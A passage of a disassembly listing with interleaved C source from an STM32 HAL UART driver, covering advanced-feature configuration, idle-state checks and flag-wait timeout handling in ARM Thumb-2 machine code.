 800598c:	6b5a      	ldr	r2, [r3, #52]	; 0x34
 800598e:	687b      	ldr	r3, [r7, #4]
 8005990:	681b      	ldr	r3, [r3, #0]
 8005992:	430a      	orrs	r2, r1
 8005994:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure TX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_TXINVERT_INIT))
 8005996:	687b      	ldr	r3, [r7, #4]
 8005998:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 800599a:	f003 0301 	and.w	r3, r3, #1
 800599e:	2b00      	cmp	r3, #0
 80059a0:	d00a      	beq.n	80059b8 <UART_AdvFeatureConfig+0x4c>
  {
    assert_param(IS_UART_ADVFEATURE_TXINV(huart->AdvancedInit.TxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_TXINV, huart->AdvancedInit.TxPinLevelInvert);
 80059a2:	687b      	ldr	r3, [r7, #4]
 80059a4:	681b      	ldr	r3, [r3, #0]
 80059a6:	685b      	ldr	r3, [r3, #4]
 80059a8:	f423 3100 	bic.w	r1, r3, #131072	; 0x20000
 80059ac:	687b      	ldr	r3, [r7, #4]
 80059ae:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 80059b0:	687b      	ldr	r3, [r7, #4]
 80059b2:	681b      	ldr	r3, [r3, #0]
 80059b4:	430a      	orrs	r2, r1
 80059b6:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXINVERT_INIT))
 80059b8:	687b      	ldr	r3, [r7, #4]
 80059ba:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059bc:	f003 0302 	and.w	r3, r3, #2
 80059c0:	2b00      	cmp	r3, #0
 80059c2:	d00a      	beq.n	80059da <UART_AdvFeatureConfig+0x6e>
  {
    assert_param(IS_UART_ADVFEATURE_RXINV(huart->AdvancedInit.RxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_RXINV, huart->AdvancedInit.RxPinLevelInvert);
 80059c4:	687b      	ldr	r3, [r7, #4]
 80059c6:	681b      	ldr	r3, [r3, #0]
 80059c8:	685b      	ldr	r3, [r3, #4]
 80059ca:	f423 3180 	bic.w	r1, r3, #65536	; 0x10000
 80059ce:	687b      	ldr	r3, [r7, #4]
 80059d0:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 80059d2:	687b      	ldr	r3, [r7, #4]
 80059d4:	681b      	ldr	r3, [r3, #0]
 80059d6:	430a      	orrs	r2, r1
 80059d8:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure data inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DATAINVERT_INIT))
 80059da:	687b      	ldr	r3, [r7, #4]
 80059dc:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059de:	f003 0304 	and.w	r3, r3, #4
 80059e2:	2b00      	cmp	r3, #0
 80059e4:	d00a      	beq.n	80059fc <UART_AdvFeatureConfig+0x90>
  {
    assert_param(IS_UART_ADVFEATURE_DATAINV(huart->AdvancedInit.DataInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_DATAINV, huart->AdvancedInit.DataInvert);
 80059e6:	687b      	ldr	r3, [r7, #4]
 80059e8:	681b      	ldr	r3, [r3, #0]
 80059ea:	685b      	ldr	r3, [r3, #4]
 80059ec:	f423 2180 	bic.w	r1, r3, #262144	; 0x40000
 80059f0:	687b      	ldr	r3, [r7, #4]
 80059f2:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 80059f4:	687b      	ldr	r3, [r7, #4]
 80059f6:	681b      	ldr	r3, [r3, #0]
 80059f8:	430a      	orrs	r2, r1
 80059fa:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX overrun detection disabling */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXOVERRUNDISABLE_INIT))
 80059fc:	687b      	ldr	r3, [r7, #4]
 80059fe:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a00:	f003 0310 	and.w	r3, r3, #16
 8005a04:	2b00      	cmp	r3, #0
 8005a06:	d00a      	beq.n	8005a1e <UART_AdvFeatureConfig+0xb2>
  {
    assert_param(IS_UART_OVERRUN(huart->AdvancedInit.OverrunDisable));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_OVRDIS, huart->AdvancedInit.OverrunDisable);
 8005a08:	687b      	ldr	r3, [r7, #4]
 8005a0a:	681b      	ldr	r3, [r3, #0]
 8005a0c:	689b      	ldr	r3, [r3, #8]
 8005a0e:	f423 5180 	bic.w	r1, r3, #4096	; 0x1000
 8005a12:	687b      	ldr	r3, [r7, #4]
 8005a14:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8005a16:	687b      	ldr	r3, [r7, #4]
 8005a18:	681b      	ldr	r3, [r3, #0]
 8005a1a:	430a      	orrs	r2, r1
 8005a1c:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure DMA disabling on reception error */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DMADISABLEONERROR_INIT))
 8005a1e:	687b      	ldr	r3, [r7, #4]
 8005a20:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a22:	f003 0320 	and.w	r3, r3, #32
 8005a26:	2b00      	cmp	r3, #0
 8005a28:	d00a      	beq.n	8005a40 <UART_AdvFeatureConfig+0xd4>
  {
    assert_param(IS_UART_ADVFEATURE_DMAONRXERROR(huart->AdvancedInit.DMADisableonRxError));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_DDRE, huart->AdvancedInit.DMADisableonRxError);
 8005a2a:	687b      	ldr	r3, [r7, #4]
 8005a2c:	681b      	ldr	r3, [r3, #0]
 8005a2e:	689b      	ldr	r3, [r3, #8]
 8005a30:	f423 5100 	bic.w	r1, r3, #8192	; 0x2000
 8005a34:	687b      	ldr	r3, [r7, #4]
 8005a36:	6bda      	ldr	r2, [r3, #60]	; 0x3c
 8005a38:	687b      	ldr	r3, [r7, #4]
 8005a3a:	681b      	ldr	r3, [r3, #0]
 8005a3c:	430a      	orrs	r2, r1
 8005a3e:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure auto Baud rate detection scheme */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_AUTOBAUDRATE_INIT))
 8005a40:	687b      	ldr	r3, [r7, #4]
 8005a42:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a44:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005a48:	2b00      	cmp	r3, #0
 8005a4a:	d01a      	beq.n	8005a82 <UART_AdvFeatureConfig+0x116>
  {
    assert_param(IS_USART_AUTOBAUDRATE_DETECTION_INSTANCE(huart->Instance));
    assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATE(huart->AdvancedInit.AutoBaudRateEnable));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_ABREN, huart->AdvancedInit.AutoBaudRateEnable);
 8005a4c:	687b      	ldr	r3, [r7, #4]
 8005a4e:	681b      	ldr	r3, [r3, #0]
 8005a50:	685b      	ldr	r3, [r3, #4]
 8005a52:	f423 1180 	bic.w	r1, r3, #1048576	; 0x100000
 8005a56:	687b      	ldr	r3, [r7, #4]
 8005a58:	6c1a      	ldr	r2, [r3, #64]	; 0x40
 8005a5a:	687b      	ldr	r3, [r7, #4]
 8005a5c:	681b      	ldr	r3, [r3, #0]
 8005a5e:	430a      	orrs	r2, r1
 8005a60:	605a      	str	r2, [r3, #4]
    /* set auto Baudrate detection parameters if detection is enabled */
    if (huart->AdvancedInit.AutoBaudRateEnable == UART_ADVFEATURE_AUTOBAUDRATE_ENABLE)
 8005a62:	687b      	ldr	r3, [r7, #4]
 8005a64:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8005a66:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005a6a:	d10a      	bne.n	8005a82 <UART_AdvFeatureConfig+0x116>
    {
      assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATEMODE(huart->AdvancedInit.AutoBaudRateMode));
      MODIFY_REG(huart->Instance->CR2, USART_CR2_ABRMODE, huart->AdvancedInit.AutoBaudRateMode);
 8005a6c:	687b      	ldr	r3, [r7, #4]
 8005a6e:	681b      	ldr	r3, [r3, #0]
 8005a70:	685b      	ldr	r3, [r3, #4]
 8005a72:	f423 01c0 	bic.w	r1, r3, #6291456	; 0x600000
 8005a76:	687b      	ldr	r3, [r7, #4]
 8005a78:	6c5a      	ldr	r2, [r3, #68]	; 0x44
 8005a7a:	687b      	ldr	r3, [r7, #4]
 8005a7c:	681b      	ldr	r3, [r3, #0]
 8005a7e:	430a      	orrs	r2, r1
 8005a80:	605a      	str	r2, [r3, #4]
    }
  }

  /* if required, configure MSB first on communication line */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_MSBFIRST_INIT))
 8005a82:	687b      	ldr	r3, [r7, #4]
 8005a84:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a86:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005a8a:	2b00      	cmp	r3, #0
 8005a8c:	d00a      	beq.n	8005aa4 <UART_AdvFeatureConfig+0x138>
  {
    assert_param(IS_UART_ADVFEATURE_MSBFIRST(huart->AdvancedInit.MSBFirst));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_MSBFIRST, huart->AdvancedInit.MSBFirst);
 8005a8e:	687b      	ldr	r3, [r7, #4]
 8005a90:	681b      	ldr	r3, [r3, #0]
 8005a92:	685b      	ldr	r3, [r3, #4]
 8005a94:	f423 2100 	bic.w	r1, r3, #524288	; 0x80000
 8005a98:	687b      	ldr	r3, [r7, #4]
 8005a9a:	6c9a      	ldr	r2, [r3, #72]	; 0x48
 8005a9c:	687b      	ldr	r3, [r7, #4]
 8005a9e:	681b      	ldr	r3, [r3, #0]
 8005aa0:	430a      	orrs	r2, r1
 8005aa2:	605a      	str	r2, [r3, #4]
  }
}
 8005aa4:	bf00      	nop
 8005aa6:	370c      	adds	r7, #12
 8005aa8:	46bd      	mov	sp, r7
 8005aaa:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005aae:	4770      	bx	lr

08005ab0 <UART_CheckIdleState>:
  * @brief Check the UART Idle State.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_CheckIdleState(UART_HandleTypeDef *huart)
{
 8005ab0:	b580      	push	{r7, lr}
 8005ab2:	b098      	sub	sp, #96	; 0x60
 8005ab4:	af02      	add	r7, sp, #8
 8005ab6:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;

  /* Initialize the UART ErrorCode */
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8005ab8:	687b      	ldr	r3, [r7, #4]
 8005aba:	2200      	movs	r2, #0
 8005abc:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

  /* Init tickstart for timeout management */
  tickstart = HAL_GetTick();
 8005ac0:	f7fb fb62 	bl	8001188 <HAL_GetTick>
 8005ac4:	6578      	str	r0, [r7, #84]	; 0x54

  /* Check if the Transmitter is enabled */
  if ((huart->Instance->CR1 & USART_CR1_TE) == USART_CR1_TE)
 8005ac6:	687b      	ldr	r3, [r7, #4]
 8005ac8:	681b      	ldr	r3, [r3, #0]
 8005aca:	681b      	ldr	r3, [r3, #0]
 8005acc:	f003 0308 	and.w	r3, r3, #8
 8005ad0:	2b08      	cmp	r3, #8
 8005ad2:	d12e      	bne.n	8005b32 <UART_CheckIdleState+0x82>
  {
    /* Wait until TEACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_TEACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005ad4:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005ad8:	9300      	str	r3, [sp, #0]
 8005ada:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005adc:	2200      	movs	r2, #0
 8005ade:	f44f 1100 	mov.w	r1, #2097152	; 0x200000
 8005ae2:	6878      	ldr	r0, [r7, #4]
 8005ae4:	f000 f88c 	bl	8005c00 <UART_WaitOnFlagUntilTimeout>
 8005ae8:	4603      	mov	r3, r0
 8005aea:	2b00      	cmp	r3, #0
 8005aec:	d021      	beq.n	8005b32 <UART_CheckIdleState+0x82>
    {
      /* Disable TXE interrupt for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE));
 8005aee:	687b      	ldr	r3, [r7, #4]
 8005af0:	681b      	ldr	r3, [r3, #0]
 8005af2:	63bb      	str	r3, [r7, #56]	; 0x38
 */
__STATIC_FORCEINLINE uint32_t __LDREXW(volatile uint32_t *addr)
{
    uint32_t result;

   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005af4:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005af6:	e853 3f00 	ldrex	r3, [r3]
 8005afa:	637b      	str	r3, [r7, #52]	; 0x34
   return(result);
 8005afc:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005afe:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005b02:	653b      	str	r3, [r7, #80]	; 0x50
 8005b04:	687b      	ldr	r3, [r7, #4]
 8005b06:	681b      	ldr	r3, [r3, #0]
 8005b08:	461a      	mov	r2, r3
 8005b0a:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8005b0c:	647b      	str	r3, [r7, #68]	; 0x44
 8005b0e:	643a      	str	r2, [r7, #64]	; 0x40
 */
__STATIC_FORCEINLINE uint32_t __STREXW(uint32_t value, volatile uint32_t *addr)
{
   uint32_t result;

   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005b10:	6c39      	ldr	r1, [r7, #64]	; 0x40
 8005b12:	6c7a      	ldr	r2, [r7, #68]	; 0x44
 8005b14:	e841 2300 	strex	r3, r2, [r1]
 8005b18:	63fb      	str	r3, [r7, #60]	; 0x3c
   return(result);
 8005b1a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8005b1c:	2b00      	cmp	r3, #0
 8005b1e:	d1e6      	bne.n	8005aee <UART_CheckIdleState+0x3e>
#endif /* USART_CR1_FIFOEN */

      huart->gState = HAL_UART_STATE_READY;
 8005b20:	687b      	ldr	r3, [r7, #4]
 8005b22:	2220      	movs	r2, #32
 8005b24:	67da      	str	r2, [r3, #124]	; 0x7c

      __HAL_UNLOCK(huart);
 8005b26:	687b      	ldr	r3, [r7, #4]
 8005b28:	2200      	movs	r2, #0
 8005b2a:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005b2e:	2303      	movs	r3, #3
 8005b30:	e062      	b.n	8005bf8 <UART_CheckIdleState+0x148>
    }
  }

  /* Check if the Receiver is enabled */
  if ((huart->Instance->CR1 & USART_CR1_RE) == USART_CR1_RE)
 8005b32:	687b      	ldr	r3, [r7, #4]
 8005b34:	681b      	ldr	r3, [r3, #0]
 8005b36:	681b      	ldr	r3, [r3, #0]
 8005b38:	f003 0304 	and.w	r3, r3, #4
 8005b3c:	2b04      	cmp	r3, #4
 8005b3e:	d149      	bne.n	8005bd4 <UART_CheckIdleState+0x124>
  {
    /* Wait until REACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005b40:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005b44:	9300      	str	r3, [sp, #0]
 8005b46:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005b48:	2200      	movs	r2, #0
 8005b4a:	f44f 0180 	mov.w	r1, #4194304	; 0x400000
 8005b4e:	6878      	ldr	r0, [r7, #4]
 8005b50:	f000 f856 	bl	8005c00 <UART_WaitOnFlagUntilTimeout>
 8005b54:	4603      	mov	r3, r0
 8005b56:	2b00      	cmp	r3, #0
 8005b58:	d03c      	beq.n	8005bd4 <UART_CheckIdleState+0x124>
      /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error)
      interrupts for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005b5a:	687b      	ldr	r3, [r7, #4]
 8005b5c:	681b      	ldr	r3, [r3, #0]
 8005b5e:	627b      	str	r3, [r7, #36]	; 0x24
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005b60:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005b62:	e853 3f00 	ldrex	r3, [r3]
 8005b66:	623b      	str	r3, [r7, #32]
   return(result);
 8005b68:	6a3b      	ldr	r3, [r7, #32]
 8005b6a:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005b6e:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005b70:	687b      	ldr	r3, [r7, #4]
 8005b72:	681b      	ldr	r3, [r3, #0]
 8005b74:	461a      	mov	r2, r3
 8005b76:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005b78:	633b      	str	r3, [r7, #48]	; 0x30
 8005b7a:	62fa      	str	r2, [r7, #44]	; 0x2c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005b7c:	6af9      	ldr	r1, [r7, #44]	; 0x2c
 8005b7e:	6b3a      	ldr	r2, [r7, #48]	; 0x30
 8005b80:	e841 2300 	strex	r3, r2, [r1]
 8005b84:	62bb      	str	r3, [r7, #40]	; 0x28
   return(result);
 8005b86:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8005b88:	2b00      	cmp	r3, #0
 8005b8a:	d1e6      	bne.n	8005b5a <UART_CheckIdleState+0xaa>
#endif /* USART_CR1_FIFOEN */
      ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005b8c:	687b      	ldr	r3, [r7, #4]
 8005b8e:	681b      	ldr	r3, [r3, #0]
 8005b90:	3308      	adds	r3, #8
 8005b92:	613b      	str	r3, [r7, #16]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005b94:	693b      	ldr	r3, [r7, #16]
 8005b96:	e853 3f00 	ldrex	r3, [r3]
 8005b9a:	60fb      	str	r3, [r7, #12]
   return(result);
 8005b9c:	68fb      	ldr	r3, [r7, #12]
 8005b9e:	f023 0301 	bic.w	r3, r3, #1
 8005ba2:	64bb      	str	r3, [r7, #72]	; 0x48
 8005ba4:	687b      	ldr	r3, [r7, #4]
 8005ba6:	681b      	ldr	r3, [r3, #0]
 8005ba8:	3308      	adds	r3, #8
 8005baa:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005bac:	61fa      	str	r2, [r7, #28]
 8005bae:	61bb      	str	r3, [r7, #24]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005bb0:	69b9      	ldr	r1, [r7, #24]
 8005bb2:	69fa      	ldr	r2, [r7, #28]
 8005bb4:	e841 2300 	strex	r3, r2, [r1]
 8005bb8:	617b      	str	r3, [r7, #20]
   return(result);
 8005bba:	697b      	ldr	r3, [r7, #20]
 8005bbc:	2b00      	cmp	r3, #0
 8005bbe:	d1e5      	bne.n	8005b8c <UART_CheckIdleState+0xdc>

      huart->RxState = HAL_UART_STATE_READY;
 8005bc0:	687b      	ldr	r3, [r7, #4]
 8005bc2:	2220      	movs	r2, #32
 8005bc4:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80

      __HAL_UNLOCK(huart);
 8005bc8:	687b      	ldr	r3, [r7, #4]
 8005bca:	2200      	movs	r2, #0
 8005bcc:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005bd0:	2303      	movs	r3, #3
 8005bd2:	e011      	b.n	8005bf8 <UART_CheckIdleState+0x148>
    }
  }

  /* Initialize the UART State */
  huart->gState = HAL_UART_STATE_READY;
 8005bd4:	687b      	ldr	r3, [r7, #4]
 8005bd6:	2220      	movs	r2, #32
 8005bd8:	67da      	str	r2, [r3, #124]	; 0x7c
  huart->RxState = HAL_UART_STATE_READY;
 8005bda:	687b      	ldr	r3, [r7, #4]
 8005bdc:	2220      	movs	r2, #32
 8005bde:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005be2:	687b      	ldr	r3, [r7, #4]
 8005be4:	2200      	movs	r2, #0
 8005be6:	661a      	str	r2, [r3, #96]	; 0x60
  huart->RxEventType = HAL_UART_RXEVENT_TC;
 8005be8:	687b      	ldr	r3, [r7, #4]
 8005bea:	2200      	movs	r2, #0
 8005bec:	665a      	str	r2, [r3, #100]	; 0x64

  __HAL_UNLOCK(huart);
 8005bee:	687b      	ldr	r3, [r7, #4]
 8005bf0:	2200      	movs	r2, #0
 8005bf2:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

  return HAL_OK;
 8005bf6:	2300      	movs	r3, #0
}
 8005bf8:	4618      	mov	r0, r3
 8005bfa:	3758      	adds	r7, #88	; 0x58
 8005bfc:	46bd      	mov	sp, r7
 8005bfe:	bd80      	pop	{r7, pc}

08005c00 <UART_WaitOnFlagUntilTimeout>:
  * @param Timeout   Timeout duration
  * @retval HAL status
  */
HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status,
                                              uint32_t Tickstart, uint32_t Timeout)
{
 8005c00:	b580      	push	{r7, lr}
 8005c02:	b084      	sub	sp, #16
 8005c04:	af00      	add	r7, sp, #0
 8005c06:	60f8      	str	r0, [r7, #12]
 8005c08:	60b9      	str	r1, [r7, #8]
 8005c0a:	603b      	str	r3, [r7, #0]
 8005c0c:	4613      	mov	r3, r2
 8005c0e:	71fb      	strb	r3, [r7, #7]
  /* Wait until flag is set */
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005c10:	e049      	b.n	8005ca6 <UART_WaitOnFlagUntilTimeout+0xa6>
  {
    /* Check for the Timeout */
    if (Timeout != HAL_MAX_DELAY)
 8005c12:	69bb      	ldr	r3, [r7, #24]
 8005c14:	f1b3 3fff 	cmp.w	r3, #4294967295
 8005c18:	d045      	beq.n	8005ca6 <UART_WaitOnFlagUntilTimeout+0xa6>
    {
      if (((HAL_GetTick() - Tickstart) > Timeout) || (Timeout == 0U))
 8005c1a:	f7fb fab5 	bl	8001188 <HAL_GetTick>
 8005c1e:	4602      	mov	r2, r0
 8005c20:	683b      	ldr	r3, [r7, #0]
 8005c22:	1ad3      	subs	r3, r2, r3
 8005c24:	69ba      	ldr	r2, [r7, #24]
 8005c26:	429a      	cmp	r2, r3
 8005c28:	d302      	bcc.n	8005c30 <UART_WaitOnFlagUntilTimeout+0x30>
 8005c2a:	69bb      	ldr	r3, [r7, #24]
 8005c2c:	2b00      	cmp	r3, #0
 8005c2e:	d101      	bne.n	8005c34 <UART_WaitOnFlagUntilTimeout+0x34>
      {

        return HAL_TIMEOUT;
 8005c30:	2303      	movs	r3, #3
 8005c32:	e048      	b.n	8005cc6 <UART_WaitOnFlagUntilTimeout+0xc6>
      }

      if (READ_BIT(huart->Instance->CR1, USART_CR1_RE) != 0U)
 8005c34:	68fb      	ldr	r3, [r7, #12]
 8005c36:	681b      	ldr	r3, [r3, #0]
 8005c38:	681b      	ldr	r3, [r3, #0]
 8005c3a:	f003 0304 	and.w	r3, r3, #4
 8005c3e:	2b00      	cmp	r3, #0
 8005c40:	d031      	beq.n	8005ca6 <UART_WaitOnFlagUntilTimeout+0xa6>
      {
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_ORE) == SET)
 8005c42:	68fb      	ldr	r3, [r7, #12]
 8005c44:	681b      	ldr	r3, [r3, #0]
 8005c46:	69db      	ldr	r3, [r3, #28]
 8005c48:	f003 0308 	and.w	r3, r3, #8
 8005c4c:	2b08      	cmp	r3, #8
 8005c4e:	d110      	bne.n	8005c72 <UART_WaitOnFlagUntilTimeout+0x72>
        {
          /* Clear Overrun Error flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF);
 8005c50:	68fb      	ldr	r3, [r7, #12]
 8005c52:	681b      	ldr	r3, [r3, #0]
 8005c54:	2208      	movs	r2, #8
 8005c56:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005c58:	68f8      	ldr	r0, [r7, #12]
 8005c5a:	f000 f838 	bl	8005cce <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_ORE;
 8005c5e:	68fb      	ldr	r3, [r7, #12]
 8005c60:	2208      	movs	r2, #8
 8005c62:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005c66:	68fb      	ldr	r3, [r7, #12]
 8005c68:	2200      	movs	r2, #0
 8005c6a:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_ERROR;
 8005c6e:	2301      	movs	r3, #1
 8005c70:	e029      	b.n	8005cc6 <UART_WaitOnFlagUntilTimeout+0xc6>
        }
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_RTOF) == SET)
 8005c72:	68fb      	ldr	r3, [r7, #12]
 8005c74:	681b      	ldr	r3, [r3, #0]
 8005c76:	69db      	ldr	r3, [r3, #28]
 8005c78:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8005c7c:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005c80:	d111      	bne.n	8005ca6 <UART_WaitOnFlagUntilTimeout+0xa6>
        {
          /* Clear Receiver Timeout flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_RTOF);
 8005c82:	68fb      	ldr	r3, [r7, #12]
 8005c84:	681b      	ldr	r3, [r3, #0]
 8005c86:	f44f 6200 	mov.w	r2, #2048	; 0x800
 8005c8a:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005c8c:	68f8      	ldr	r0, [r7, #12]
 8005c8e:	f000 f81e 	bl	8005cce <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_RTO;
 8005c92:	68fb      	ldr	r3, [r7, #12]
 8005c94:	2220      	movs	r2, #32
 8005c96:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005c9a:	68fb      	ldr	r3, [r7, #12]
 8005c9c:	2200      	movs	r2, #0
 8005c9e:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_TIMEOUT;
 8005ca2:	2303      	movs	r3, #3
 8005ca4:	e00f      	b.n	8005cc6 <UART_WaitOnFlagUntilTimeout+0xc6>
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005ca6:	68fb      	ldr	r3, [r7, #12]
 8005ca8:	681b      	ldr	r3, [r3, #0]
 8005caa:	69da      	ldr	r2, [r3, #28]
 8005cac:	68bb      	ldr	r3, [r7, #8]
 8005cae:	4013      	ands	r3, r2
 8005cb0:	68ba      	ldr	r2, [r7, #8]
 8005cb2:	429a      	cmp	r2, r3
 8005cb4:	bf0c      	ite	eq
 8005cb6:	2301      	moveq	r3, #1
 8005cb8:	2300      	movne	r3, #0
 8005cba:	b2db      	uxtb	r3, r3
 8005cbc:	461a      	mov	r2, r3
 8005cbe:	79fb      	ldrb	r3, [r7, #7]
 8005cc0:	429a      	cmp	r2, r3
 8005cc2:	d0a6      	beq.n	8005c12 <UART_WaitOnFlagUntilTimeout+0x12>
        }
      }
    }
  }
  return HAL_OK;
 8005cc4:	2300      	movs	r3, #0
}
 8005cc6:	4618      	mov	r0, r3
 8005cc8:	3710      	adds	r7, #16
 8005cca:	46bd      	mov	sp, r7
 8005ccc:	bd80      	pop	{r7, pc}

08005cce <UART_EndRxTransfer>:
  * @brief  End ongoing Rx transfer on UART peripheral (following error detection or Reception completion).
  * @param  huart UART handle.
  * @retval None
  */
static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
 8005cce:	b480      	push	{r7}
 8005cd0:	b095      	sub	sp, #84	; 0x54
 8005cd2:	af00      	add	r7, sp, #0
 8005cd4:	6078      	str	r0, [r7, #4]
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
#if defined(USART_CR1_FIFOEN)
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
  ATOMIC_CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE));
#else
  ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005cd6:	687b      	ldr	r3, [r7, #4]
 8005cd8:	681b      	ldr	r3, [r3, #0]
 8005cda:	637b      	str	r3, [r7, #52]	; 0x34
